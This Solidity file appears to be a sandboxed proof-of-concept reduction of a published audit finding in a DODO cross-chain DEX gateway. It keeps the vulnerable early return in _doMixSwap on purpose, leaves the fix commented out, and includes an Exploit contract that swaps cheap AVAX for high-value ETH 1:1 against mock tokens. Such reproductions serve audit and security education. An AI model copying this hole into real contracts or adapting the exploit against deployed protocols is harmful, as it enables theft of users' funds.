// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    DODO Cross-Chain DEX — [H-3] Attacker can steal a high-value token due to
    lack of swap execution (Sherlock 2025-05-dodo-cross-chain-dex, #58580)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: _doMixSwap returns `amount` unchanged when swapData is empty,
    with no check that zrc20 == targetZRC20. Attacker deposits cheap token,
    sets empty swapData + high-value targetZRC20, and receives 1:1 of the
    expensive token from accumulated balances. Vulnerable early-return preserved
    VERBATIM (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Real mix-swap used only when swapData is non-empty.
contract MockMixSwap {
    function mixSwap(address fromToken, address toToken, uint256 amount) external returns (uint256) {
        MockERC20(fromToken).transferFrom(msg.sender, address(this), amount);
        MockERC20(toToken).transfer(msg.sender, amount);
        return amount;
    }
}

/// @notice Reduction of GatewayTransferNative._doMixSwap + withdrawToNativeChain.
///         Source: GatewayTransferNative.sol#L425-L430
///         (sherlock-audit/2025-05-dodo-cross-chain-dex @ d4834a4).
contract GatewayTransferNative {
    MockMixSwap public immutable swapRouter;
    uint256 public constant GAS_FEE = 0;

    constructor(MockMixSwap _swap) {
        swapRouter = _swap;
    }

    /// @param zrc20       deposited input token
    /// @param amount      deposited amount
    /// @param targetZRC20 decoded.targetZRC20 (withdrawal token)
    /// @param swapData    empty ⇒ early-return amount with no token match check
    /// @param receiver    recipient of withdrawn target tokens
    function withdrawToNativeChain(
        address zrc20,
        uint256 amount,
        address targetZRC20,
        bytes calldata swapData,
        address receiver
    ) external {
        require(MockERC20(zrc20).transferFrom(msg.sender, address(this), amount), "in");

        uint256 outputAmount = _doMixSwap(zrc20, targetZRC20, swapData, amount);
        _withdraw(targetZRC20, receiver, outputAmount - GAS_FEE);
    }

    function _doMixSwap(address zrc20, address toToken, bytes memory swapData, uint256 amount)
        internal
        returns (uint256 outputAmount)
    {
        if (swapData.length == 0) {
            // FIX: require(toToken == zrc20, "swap required");
            return amount; // @> VULN: empty swapData returns amount without requiring toToken == zrc20 — 1:1 drain of a different high-value target
        }
        MockERC20(zrc20).approve(address(swapRouter), amount);
        return swapRouter.mixSwap(zrc20, toToken, amount);
    }

    function _withdraw(address token, address receiver, uint256 amount) internal {
        require(MockERC20(token).transfer(receiver, amount), "out");
    }
}

contract AttackerReceiver {}

/// CREATE order: avax (1), eth (2), swap (3), gateway (4), attackerRecv (5).
contract Exploit {
    MockERC20 public avax; // cheap input (~$20 stand-in)
    MockERC20 public eth; // high-value target (~$2300 stand-in)
    MockMixSwap public swapRouter;
    GatewayTransferNative public gateway;
    AttackerReceiver public attackerRecv;

    uint256 public stolen;
    uint256 public constant ATTACK_AMOUNT = 100 ether;
    uint256 public constant ACCUMULATED_ETH = 2000 ether;

    constructor() {
        avax = new MockERC20("AVAX.Z"); // 1
        eth = new MockERC20("ETH.ARB.Z"); // 2
        swapRouter = new MockMixSwap(); // 3
        gateway = new GatewayTransferNative(swapRouter); // 4
        attackerRecv = new AttackerReceiver(); // 5

        eth.mint(address(gateway), ACCUMULATED_ETH);
        avax.mint(address(this), ATTACK_AMOUNT);
    }

    function run() external {
        uint256 gwEthBefore = eth.balanceOf(address(gateway));
        uint256 recvBefore = eth.balanceOf(address(attackerRecv));

        // Deposit cheap AVAX, empty swapData, target = expensive ETH.ARB.
        avax.approve(address(gateway), ATTACK_AMOUNT);
        gateway.withdrawToNativeChain(
            address(avax),
            ATTACK_AMOUNT,
            address(eth),
            "", // empty swapData → early return amount
            address(attackerRecv)
        );

        stolen = eth.balanceOf(address(attackerRecv)) - recvBefore;
        require(stolen == ATTACK_AMOUNT, "1:1 eth stolen");
        require(eth.balanceOf(address(gateway)) == gwEthBefore - ATTACK_AMOUNT, "gw eth");
        // Cheap AVAX was deposited and sits unused on the gateway.
        require(avax.balanceOf(address(gateway)) == ATTACK_AMOUNT, "avax parked");
        require(stolen > 0, "harm not demonstrated");
    }
}
